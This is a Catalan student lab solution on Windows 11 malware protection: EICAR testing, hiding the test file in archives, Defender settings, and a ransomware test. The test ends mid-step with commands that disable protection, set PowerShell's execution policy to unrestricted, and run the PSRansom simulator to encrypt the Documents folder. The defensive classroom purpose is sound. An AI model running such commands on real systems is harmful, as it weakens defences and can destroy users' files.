# Solució T08
## windos 11

![w11](img\windosws.png)

### Activitats

1. Seguiu les instruccions de l'enllaç que trobareu a https://www.eicar.org per a obtenir una còpia del test EICAR.

![protecio](img\protecio.png)

Pot ser que hagueu de desactivar de forma temporal el detector del navegador web i el de Windows per a poder baixar-lo. Expliqueu com es fa.

Activeu i comproveu si el detecta l'antimalware escollit.

2. Torneu a desactivar la detecció en temps real. Proveu ara a tornar a baixar i a amagar el virus EICAR dintre un arxiu comprimit en formats diferents. Podeu fer servir eines com winzip, winrar o 7zip per comprimir el fitxer. Torna a activar l'antimalware. Indica en cada cas si l'antimalware detecta l'amenaça:

 zip
 tar
 7zip

## Sistemes protecció Windows 11

1. Quines proteccions incorporar Windows 11 a la seccció de "Protección antivirus y contra amenazas"?

- Amenazas actuales

![virus](img\virusprotecio.png)

- Configuracion de antivirus y protecion contra amenazas 

![confuguracio](img\configuracion.png)

- Actualizaciones de protecion y contra amenazas

![ultima](img\ultima.png)

- Protección contra ransomware

![protecio ramsoware](img\protecioramsoware.png)

2. Quines opcions tenim a "Control de aplicaciones y navegador"?
Control de aplicaciones y navegador protege el sistema frente a apps maliciosas y sitios web peligrosos, bloqueando descargas y ejecuciones inseguras.
Ayuda a prevenir virus, phishing y ataques mientras navegas o instalas programas.

![](img\controldeaplicacions.png)


3. Investigueu 
La protección contra ransomware incluye acceso controlado a carpetas, que bloquea cambios no autorizados en archivos importantes.
También permite recuperar datos con OneDrive mediante copias de seguridad si ocurre un ataque.

![](img\PROYECIORAMSOMWARE.png)

## Prova pràctica de protecció contra Ransomware

Ara comprovarem el funcionacionament específic de les proteccions contra ransomware, feu el següent:

1. Afegiu dins la carpeta "Documents" uns quants arxius TXT.

![](img\DOCUMENTOS.png)

2. Desactiveu, si està activada prèviament, la protecció contra ransomware.

![](img\carpetaramsom.png)


3. Descarregeu el fitxer de prova de ransomware de https://github.com/JoelGMSec/PSRansom. Es tracta d'un script de PowerShell que simula el comportament d'un ransomware. Com per defecte, Windows 11 restringeix l'execució d'scripts de PowerShell, haureu de canviar la política d'execució per permetre-ho, obrint una finestra de PowerShell com a administrador i executant la següent ordre:

![](img\descarga.png)

![](img\comprimidos.png)

``` bash
Set-ExecutionPolicy -ExecutionPolicy unrestricted
```

4. Obre una consola de PoweShell a la carpeta on hagis descarregat l'script i executa'l amb la següent ordre:
``` bash
.\PSRansom.ps1 -e C:\Users\%USERNAME%\Documents -s 127.0.0.1 -p 80 -x
